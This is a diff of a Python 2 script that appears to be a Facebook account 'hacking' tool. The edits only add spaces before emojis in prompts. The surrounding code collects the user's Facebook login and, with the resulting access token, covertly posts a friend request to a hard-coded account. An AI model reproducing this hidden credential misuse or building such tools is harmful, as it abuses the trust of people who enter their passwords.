@@ -129,7 +129,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[⚡] \x1b[1;93mLogin your new id use this tools😊 \x1b[1;93m[⚡]' )
+		print('\033[1;96m[⚡] \x1b[1;93mLogin your new id use this tools 😊 \x1b[1;93m[⚡]' )
 		id = raw_input('\033[1;963m[+] \x1b[0;34mEnter ID/Email \x1b[1;93m: \x1b[1;93m')
 		pwd = raw_input('\033[1;93m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
 		tik()
@@ -163,7 +163,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mNo internet connection chack and try agin☺"
+				print"\n\033[1;96m[!] \x1b[1;91mNo internet connection chack and try agin ☺"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mLooks like your account is at checkpoint🔐")
@@ -171,7 +171,7 @@ def login():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mEmail/password wrong😒")
+			print("\n\033[1;96m[!] \x1b[1;91mEmail/password wrong 😒")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -211,9 +211,9 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;33;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;41mHacking start🎭"	
-	print "\033[1;32;40m[2] \033[1;33;42mUpdate tool👩‍🔧"																														
-	print "\033[1;32;40m[0] \033[1;33;43mLog out☺"
+	print "\033[1;32;40m[1] \033[1;33;41mHacking start 🎭"	
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate tool 🔧"																														
+	print "\033[1;32;40m[0] \033[1;33;43mLog out ☺"
 	pilih()
 	
 def pilih():
